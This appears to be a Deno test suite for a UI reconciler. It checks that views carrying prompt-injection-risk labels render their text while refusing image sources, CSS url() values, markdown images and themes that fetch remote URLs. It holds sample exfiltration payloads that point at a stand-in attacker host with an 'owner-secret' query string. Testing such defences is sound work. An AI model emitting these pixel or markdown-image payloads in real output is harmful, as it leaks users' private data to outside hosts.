import { assertEquals } from "@std/assert";

import type { FabricValue } from "@commonfabric/data-model";

import type { CfcAtom } from "@commonfabric/api/cfc";
import {
  CFC_ATOM_TYPE,
  CFC_CONCEPT_KIND,
  cfcAtom,
} from "@commonfabric/api/cfc";
import { Identity } from "@commonfabric/identity";
import { KeepAsCell, Runtime } from "@commonfabric/runner";
import {
  createRenderConfidentialityResolver,
  PROMPT_CAVEAT_FAMILY_KINDS,
} from "@commonfabric/runner/cfc";
import { rendererVDOMSchema } from "@commonfabric/runner/schemas";
import { StorageManager } from "@commonfabric/runner/storage/cache.deno";

import {
  SEED_ENVELOPE_SCHEMA_HASH,
  seedStoredEnvelope,
  writeSeedEnvelopeDoc,
} from "../../runner/test/cfc-seed-envelope.ts";
import type { VDomOp } from "../src/vdom-ops.ts";
import {
  REMOTE_LOAD_PROPS,
  WorkerReconciler,
} from "../src/worker/reconciler.ts";

// The default display ceiling admits the prompt-caveat family (SC-54), so
// text carrying an injection-risk caveat renders for its owner. A render that
// FETCHES a URL is network egress, not display: before the family was
// admitted, a value carrying a material-risk caveat never rendered, so it
// never fetched. These pin that a URL fetch keeps that older ceiling while the
// text around it renders. The op stream is asserted, not the final DOM: a
// `set-prop src` later removed has already started the fetch.

function createOpsCollector() {
  const allOps: VDomOp[] = [];
  return {
    onOps: (ops: VDomOp[]) => {
      for (const op of ops) allOps.push(op);
    },
    clear: () => {
      allOps.length = 0;
    },
    all: () => [...allOps],
  };
}

const ATTACKER_URL = "https://attacker.example/pixel?d=owner-secret";

function setProps(ops: readonly VDomOp[], key: string): unknown[] {
  return ops.flatMap((op) =>
    op.op === "set-prop" && op.key === key ? [op.value] : []
  );
}

function bindings(ops: readonly VDomOp[], propName: string): number {
  return ops.filter((op) => op.op === "set-binding" && op.propName === propName)
    .length;
}

function texts(ops: readonly VDomOp[]): string[] {
  return ops.flatMap((op) => op.op === "create-text" ? [op.text] : []);
}

Deno.test("render-time URL fetches keep the pre-family ceiling", async (t) => {
  const signer = await Identity.fromPassphrase(
    "worker reconciler remote loads",
  );
  const owner = signer.did();
  const storageManager = StorageManager.emulate({ as: signer });
  const runtime = new Runtime({
    storageManager,
    apiUrl: new URL("http://localhost"),
  });
  const caveat = (kind: string): CfcAtom => ({
    type: CFC_ATOM_TYPE.Caveat,
    kind,
    source: "of:untrusted-sender",
  });
  const unscreened = caveat(CFC_CONCEPT_KIND.PromptInjectionRiskUnscreened);

  // The production ceiling lib-shell builds, and its resolver.
  const ceiling = {
    atoms: [cfcAtom.user(owner), cfcAtom.personalSpace(owner), owner],
    caveatKinds: [...PROMPT_CAVEAT_FAMILY_KINDS],
  };
  const reconcilerFor = (
    onOps: (ops: VDomOp[]) => void,
    withCeiling = true,
  ) =>
    new WorkerReconciler({
      onOps,
      ...(withCeiling
        ? {
          renderConfidentialityCeiling: ceiling,
          resolveRenderConfidentiality: createRenderConfidentialityResolver({
            actingPrincipal: owner,
            memberSpaces: [owner],
          }),
        }
        : {}),
    });

  let seq = 0;
  /** Seeds a document holding `value`, labelled as a whole. */
  const seed = async (
    value: FabricValue,
    confidentiality: readonly CfcAtom[],
    id = `remote-loads-${++seq}`,
  ) => {
    const tx = runtime.edit();
    const cell = runtime.getCell(owner, id, undefined, tx);
    const link = cell.getAsNormalizedFullLink();
    writeSeedEnvelopeDoc(tx, owner);
    seedStoredEnvelope(tx, {
      space: owner,
      id: link.id!,
      type: "application/json",
      path: [],
    }, {
      value,
      cfc: {
        version: 1,
        schemaHash: SEED_ENVELOPE_SCHEMA_HASH,
        labelMap: {
          version: 1,
          entries: [{ path: [], label: { confidentiality } }],
        },
      },
    });
    assertEquals((await tx.commit()).ok !== undefined, true);
    return id;
  };
  const linkTo = (id: string, path: string[] = []) => {
    let cell = runtime.getCell(owner, id);
    for (const key of path) cell = cell.key(key as never) as typeof cell;
    return cell.getAsLink({ includeSchema: true, keepAsCell: KeepAsCell.All });
  };
  /** Mounts `id` the way the runtime mounts a piece's UI and settles. */
  const render = async (id: string, withCeiling = true) => {
    const collector = createOpsCollector();
    const reconciler = reconcilerFor(collector.onOps, withCeiling);
    const cancel = reconciler.mount(
      runtime.getCell(owner, id).asSchema(rendererVDOMSchema) as never,
    );
    await t.settle();
    return { collector, cancel };
  };

  const pixelView = (extra: Record<string, FabricValue> = {}) => ({
    type: "vnode",
    name: "div",
    props: { style: "color: red" },
    children: [
      { type: "vnode", name: "span", props: {}, children: ["Owner text"] },
      {
        type: "vnode",
        name: "img",
        props: { src: ATTACKER_URL, alt: "pixel", ...extra },
        children: [],
      },
    ],
  });

  // Every material-risk tier, in both spellings, keeps a URL from fetching.
  for (
    const kind of [
      CFC_CONCEPT_KIND.PromptInjectionRiskUnscreened,
      CFC_CONCEPT_KIND.PromptInjectionRiskIngressScreened,
      CFC_CONCEPT_KIND.PromptInjectionRiskValueScreened,
      "prompt-injection-risk-unscreened",
      "prompt-injection-risk-ingress-screened",
      "prompt-injection-risk-value-screened",
    ]
  ) {
    await t.step(
      `a view under ${kind} renders its text, never its src`,
      async () => {
        const id = await seed(pixelView(), [owner, caveat(kind)]);
        const { collector, cancel } = await render(id);
        try {
          const ops = collector.all();
          assertEquals(texts(ops).includes("Owner text"), true);
          assertEquals(setProps(ops, "src"), []);
          // A prop that fetches nothing still applies, styling included.
          assertEquals(setProps(ops, "alt").includes("pixel"), true);
          assertEquals(setProps(ops, "style").includes("color: red"), true);
        } finally {
          cancel();
        }
      },
    );
  }

  await t.step(
    "prompt influence keeps fetching, as before the family",
    async () => {
      const id = await seed(pixelView(), [
        owner,
        caveat(CFC_CONCEPT_KIND.PromptInfluence),
      ]);
      const { collector, cancel } = await render(id);
      try {
        assertEquals(setProps(collector.all(), "src"), [ATTACKER_URL]);
      } finally {
        cancel();
      }
    },
  );

  await t.step("the owner's own uncaveated image fetches", async () => {
    const id = await seed(pixelView(), [owner]);
    const { collector, cancel } = await render(id);
    try {
      assertEquals(setProps(collector.all(), "src"), [ATTACKER_URL]);
    } finally {
      cancel();
    }
  });

  await t.step("with no ceiling configured nothing is gated", async () => {
    const id = await seed(pixelView(), [owner, unscreened]);
    const { collector, cancel } = await render(id, false);
    try {
      assertEquals(setProps(collector.all(), "src"), [ATTACKER_URL]);
    } finally {
      cancel();
    }
  });

  await t.step(
    "a style that can name a URL is refused; one that cannot applies",
    async () => {
      const id = await seed({
        type: "vnode",
        name: "div",
        props: {},
        children: [
          {
            type: "vnode",
            name: "p",
            props: { style: `background-image: url(${ATTACKER_URL})` },
            children: ["Fetching style"],
          },
          {
            type: "vnode",
            name: "p",
            props: { style: "font-weight: bold" },
            children: ["Plain style"],
          },
        ],
      }, [owner, unscreened]);
      const { collector, cancel } = await render(id);
      try {
        const styles = setProps(collector.all(), "style");
        assertEquals(styles.includes("font-weight: bold"), true);
        assertEquals(
          styles.some((style) => String(style).includes("url(")),
          false,
        );
      } finally {
        cancel();
      }
    },
  );

  await t.step("an upper-case tag is the same element", async () => {
    const id = await seed({
      type: "vnode",
      name: "IMG",
      props: { SRC: ATTACKER_URL },
      children: [],
    }, [owner, unscreened]);
    const { collector, cancel } = await render(id);
    try {
      assertEquals(setProps(collector.all(), "SRC"), []);
    } finally {
      cancel();
    }
  });

  await t.step(
    "a <style> element's text does not render under the caveat",
    async () => {
      const css = `body { background: url(${ATTACKER_URL}) }`;
      const id = await seed({
        type: "vnode",
        name: "div",
        props: {},
        children: [
          { type: "vnode", name: "style", props: {}, children: [css] },
          "Visible text",
        ],
      }, [owner, unscreened]);
      const { collector, cancel } = await render(id);
      try {
        const rendered = texts(collector.all());
        assertEquals(rendered.includes("Visible text"), true);
        assertEquals(rendered.includes(css), false);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "a render boundary inside the view keeps the fetch refused",
    async () => {
      // The src is a clean cell, so only the view's inherited block can
      // refuse it.
      const clean = await seed("https://images.example/clean.png", [owner]);
      const id = await seed({
        type: "vnode",
        name: "cf-cfc-render-boundary",
        props: {},
        children: [{
          type: "vnode",
          name: "img",
          props: { src: linkTo(clean) },
          children: [],
        }],
      }, [owner, unscreened]);
      const { collector, cancel } = await render(id);
      try {
        assertEquals(setProps(collector.all(), "src"), []);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "a src read from a caveated cell is refused; its text renders",
    async () => {
      const value = await seed(ATTACKER_URL, [owner, unscreened]);
      const id = await seed({
        type: "vnode",
        name: "div",
        props: {},
        children: [
          {
            type: "vnode",
            name: "img",
            props: { src: linkTo(value) },
            children: [],
          },
          linkTo(value),
        ],
      }, [owner]);
      const { collector, cancel } = await render(id);
      try {
        const ops = collector.all();
        assertEquals(texts(ops).includes(ATTACKER_URL), true);
        assertEquals(setProps(ops, "src"), []);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "a clean src inside a caveated view is refused too",
    async () => {
      // The caveated view chose which image to show, so loading even a clean
      // URL tells its host what the view decided.
      const value = await seed("https://images.example/clean.png", [owner]);
      const id = await seed({
        type: "vnode",
        name: "img",
        props: { src: linkTo(value) },
        children: [],
      }, [owner, unscreened]);
      const { collector, cancel } = await render(id);
      try {
        assertEquals(setProps(collector.all(), "src"), []);
      } finally {
        cancel();
      }
    },
  );

  await t.step("markdown content from a caveated cell is refused", async () => {
    const value = await seed(`![x](${ATTACKER_URL})`, [owner, unscreened]);
    const id = await seed({
      type: "vnode",
      name: "cf-markdown",
      props: { content: linkTo(value), $value: linkTo(value) },
      children: [],
    }, [owner]);
    const { collector, cancel } = await render(id);
    try {
      const ops = collector.all();
      assertEquals(setProps(ops, "content"), []);
    } finally {
      cancel();
    }
  });

  await t.step("a markdown binding to a caveated cell is refused", async () => {
    const value = await seed(`![x](${ATTACKER_URL})`, [owner, unscreened]);
    const id = await seed({
      type: "vnode",
      name: "cf-markdown",
      props: { $content: linkTo(value) },
      children: [],
    }, [owner]);
    const { collector, cancel } = await render(id);
    try {
      assertEquals(bindings(collector.all(), "content"), 0);
    } finally {
      cancel();
    }
  });

  // A caveated cell that points at a separate, clean view document. Reading
  // the clean view does not pass through the caveated cell, so its own labels
  // admit every fetch; only the block the caveated cell sets on its subtree
  // can refuse one. The caveated cell decided which view to show, so loading
  // anything in it tells a host what it decided.
  const pointer = async (view: FabricValue, caveated: boolean) => {
    const target = await seed(view, [owner]);
    const ref = await seed(
      linkTo(target),
      caveated ? [owner, unscreened] : [owner],
    );
    const id = await seed({
      type: "vnode",
      name: "div",
      props: {},
      children: [linkTo(ref)],
    }, [owner]);
    return { id, ref, target };
  };

  // A caveated view whose own document embeds a separate, clean view through
  // a link child. Reading the embedded view passes through neither the
  // caveated document nor a link in it, so only the block the caveated view
  // sets on its subtree can refuse a fetch inside it.
  const embedded = async (view: FabricValue) => {
    const inner = await seed(view, [owner]);
    const outer = await seed({
      type: "vnode",
      name: "section",
      props: {},
      children: [linkTo(inner)],
    }, [owner, unscreened]);
    return await seed({
      type: "vnode",
      name: "div",
      props: {},
      children: [linkTo(outer)],
    }, [owner]);
  };

  await t.step(
    "a caveated cell pointing at a clean view sets none of its fetches",
    async () => {
      const { id } = await pointer(pixelView(), true);
      const { collector, cancel } = await render(id);
      try {
        const ops = collector.all();
        assertEquals(texts(ops).includes("Owner text"), true);
        assertEquals(setProps(ops, "src"), []);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "an uncaveated cell pointing at the same view fetches (control)",
    async () => {
      const { id } = await pointer(pixelView(), false);
      const { collector, cancel } = await render(id);
      try {
        assertEquals(setProps(collector.all(), "src"), [ATTACKER_URL]);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "an embedded view's render boundary keeps the block",
    async () => {
      const id = await embedded({
        type: "vnode",
        name: "cf-cfc-render-boundary",
        props: {},
        children: [{
          type: "vnode",
          name: "img",
          props: { src: ATTACKER_URL },
          children: [],
        }],
      });
      const { collector, cancel } = await render(id);
      try {
        assertEquals(setProps(collector.all(), "src"), []);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "an embedded view's <style> text does not render",
    async () => {
      const css = `body { background: url(${ATTACKER_URL}) }`;
      const id = await embedded({
        type: "vnode",
        name: "div",
        props: {},
        children: [
          { type: "vnode", name: "style", props: {}, children: [css] },
          "Visible text",
        ],
      });
      const { collector, cancel } = await render(id);
      try {
        const rendered = texts(collector.all());
        assertEquals(rendered.includes("Visible text"), true);
        assertEquals(rendered.includes(css), false);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "a view that gains the caveat stops the clean view it embeds fetching",
    async () => {
      // The relabelled view's own document changes, so it re-decides; the
      // clean view it embeds does not, so only the re-decision can take back
      // the src it set. (A label change on a document a link merely passes
      // through is not observed at all, for the display gate either.)
      const inner = await seed(pixelView(), [owner]);
      const outer = "remote-loads-embedding-flip";
      const embedding = {
        type: "vnode",
        name: "section",
        props: {},
        children: [linkTo(inner)],
      };
      await seed(embedding, [owner], outer);
      const id = await seed({
        type: "vnode",
        name: "div",
        props: {},
        children: [linkTo(outer)],
      }, [owner]);
      const { collector, cancel } = await render(id);
      try {
        assertEquals(setProps(collector.all(), "src"), [ATTACKER_URL]);
        collector.clear();
        await seed(embedding, [owner, unscreened], outer);
        await t.settle();
        const ops = collector.all();
        assertEquals(setProps(ops, "src"), []);
        assertEquals(
          ops.some((op) =>
            op.op === "remove-node" ||
            (op.op === "remove-prop" && op.key === "src")
          ),
          true,
        );
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "a view that gains the caveat with the same value stops fetching",
    async () => {
      const id = "remote-loads-flip";
      await seed(pixelView(), [owner], id);
      const { collector, cancel } = await render(id);
      try {
        assertEquals(setProps(collector.all(), "src"), [ATTACKER_URL]);
        collector.clear();
        await seed(pixelView(), [owner, unscreened], id);
        await t.settle();
        const ops = collector.all();
        assertEquals(setProps(ops, "src"), []);
        // The fetching element is gone or its src removed.
        assertEquals(
          ops.some((op) =>
            op.op === "remove-node" ||
            (op.op === "remove-prop" && op.key === "src")
          ),
          true,
        );
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "the omnibox preview of a caveated reply is refused",
    async () => {
      const value = await seed(`![x](${ATTACKER_URL})`, [owner, unscreened]);
      const id = await seed({
        type: "vnode",
        name: "cf-fab",
        props: { $previewMessage: linkTo(value), $messages: linkTo(value) },
        children: [],
      }, [owner]);
      const { collector, cancel } = await render(id);
      try {
        const ops = collector.all();
        assertEquals(bindings(ops, "previewMessage"), 0);
        assertEquals(bindings(ops, "messages"), 0);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "a theme that can name a URL is refused; plain colors apply",
    async () => {
      const id = await seed({
        type: "vnode",
        name: "div",
        props: {},
        children: [
          {
            type: "vnode",
            name: "cf-chat",
            props: {
              theme: { colors: { background: `url(${ATTACKER_URL})` } },
            },
            children: [],
          },
          {
            type: "vnode",
            name: "cf-button",
            props: { theme: { colors: { background: "#ffffff" } } },
            children: [],
          },
        ],
      }, [owner, unscreened]);
      const { collector, cancel } = await render(id);
      try {
        const themes = setProps(collector.all(), "theme").map((theme) =>
          JSON.stringify(theme)
        );
        assertEquals(themes.some((theme) => theme.includes("url(")), false);
        assertEquals(themes.some((theme) => theme.includes("#ffffff")), true);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "an object style is decided entry by entry",
    async () => {
      const id = await seed({
        type: "vnode",
        name: "div",
        props: {},
        children: [
          {
            type: "vnode",
            name: "p",
            props: { style: { fontFamily: '"Iowan Old Style", serif' } },
            children: ["Quoted font"],
          },
          {
            type: "vnode",
            name: "p",
            props: { style: { "--hero": `"${ATTACKER_URL}"` } },
            children: ["Custom property"],
          },
        ],
      }, [owner, unscreened]);
      const { collector, cancel } = await render(id);
      try {
        const styles = setProps(collector.all(), "style").map(String);
        assertEquals(styles.some((style) => style.includes("Iowan")), true);
        assertEquals(styles.some((style) => style.includes("--hero")), false);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "props read from a separate caveated document set no fetch",
    async () => {
      const props = await seed({ src: ATTACKER_URL, alt: "x" }, [
        owner,
        unscreened,
      ]);
      const id = await seed({
        type: "vnode",
        name: "img",
        props: linkTo(props),
        children: [],
      }, [owner]);
      const { collector, cancel } = await render(id);
      try {
        assertEquals(setProps(collector.all(), "src"), []);
      } finally {
        cancel();
      }
    },
  );

  // Every component entry in the table, as a literal in a caveated view.
  for (const [tag, props] of REMOTE_LOAD_PROPS) {
    if (tag === "*") continue;
    for (const prop of props) {
      await t.step(`${tag} ${prop} is refused in a caveated view`, async () => {
        const id = await seed({
          type: "vnode",
          name: tag,
          props: { [prop]: ATTACKER_URL },
          children: [],
        }, [owner, unscreened]);
        const { collector, cancel } = await render(id);
        try {
          const ops = collector.all();
          assertEquals(
            ops.filter((op) =>
              op.op === "set-prop" && op.key.toLowerCase() === prop
            ),
            [],
          );
        } finally {
          cancel();
        }
      });
    }
  }

  // The subtree block on its own: these views' data is clean, so the per-read
  // fit admits every load; only the block refuses them.
  const mountBlocked = async (vnode: unknown) => {
    const collector = createOpsCollector();
    const reconciler = reconcilerFor(collector.onOps);
    const cancel = reconciler.accessForTestingOnly.mountWithRemoteLoadsBlocked(
      vnode as never,
    );
    await t.settle();
    return { collector, cancel };
  };

  await t.step(
    "under the block, a static view sets no fetch and keeps its text",
    async () => {
      const { collector, cancel } = await mountBlocked(pixelView());
      try {
        const ops = collector.all();
        assertEquals(texts(ops).includes("Owner text"), true);
        assertEquals(setProps(ops, "src"), []);
        assertEquals(setProps(ops, "style").includes("color: red"), true);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "under the block, a render boundary keeps it",
    async () => {
      const { collector, cancel } = await mountBlocked({
        type: "vnode",
        name: "cf-cfc-render-boundary",
        props: {},
        children: [{
          type: "vnode",
          name: "img",
          props: { src: ATTACKER_URL },
          children: [],
        }],
      });
      try {
        assertEquals(setProps(collector.all(), "src"), []);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "under the block, a style element's text does not render",
    async () => {
      const css = `body { background: url(${ATTACKER_URL}) }`;
      const { collector, cancel } = await mountBlocked({
        type: "vnode",
        name: "div",
        props: {},
        children: [
          { type: "vnode", name: "style", props: {}, children: [css] },
          "Visible text",
        ],
      });
      try {
        const rendered = texts(collector.all());
        assertEquals(rendered.includes("Visible text"), true);
        assertEquals(rendered.includes(css), false);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "under the block, a clean document's props set no fetch",
    async () => {
      const id = await seed(pixelView(), [owner]);
      const { collector, cancel } = await mountBlocked(
        runtime.getCell(owner, id).asSchema(rendererVDOMSchema),
      );
      try {
        assertEquals(setProps(collector.all(), "src"), []);
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "under the block, a style that comes to name a URL is removed",
    async () => {
      const id = "remote-loads-style-change";
      const styled = (style: string) => ({
        type: "vnode",
        name: "p",
        props: { style },
        children: ["Styled"],
      });
      await seed(styled("color: red"), [owner], id);
      const { collector, cancel } = await mountBlocked(
        runtime.getCell(owner, id).asSchema(rendererVDOMSchema),
      );
      try {
        assertEquals(setProps(collector.all(), "style"), ["color: red"]);
        collector.clear();
        await seed(styled(`background: url(${ATTACKER_URL})`), [owner], id);
        await t.settle();
        const ops = collector.all();
        assertEquals(setProps(ops, "style"), []);
        assertEquals(
          ops.some((op) =>
            op.op === "remove-node" ||
            (op.op === "remove-prop" && op.key === "style")
          ),
          true,
        );
      } finally {
        cancel();
      }
    },
  );

  await t.step(
    "under the block, a plain-props style that comes to name a URL is removed",
    async () => {
      const id = "remote-loads-style-change-plain";
      const styled = (style: string) => ({
        type: "vnode",
        name: "p",
        props: { style },
        children: ["Styled"],
      });
      await seed(styled("color: red"), [owner], id);
      const { collector, cancel } = await mountBlocked(
        // Without the renderer's schema, props arrive as a plain object and
        // take the static path.
        runtime.getCell(owner, id),
      );
      try {
        assertEquals(setProps(collector.all(), "style"), ["color: red"]);
        collector.clear();
        await seed(styled(`background: url(${ATTACKER_URL})`), [owner], id);
        await t.settle();
        const ops = collector.all();
        assertEquals(setProps(ops, "style"), []);
        assertEquals(
          ops.some((op) =>
            op.op === "remove-node" ||
            (op.op === "remove-prop" && op.key === "style")
          ),
          true,
        );
      } finally {
        cancel();
      }
    },
  );
});
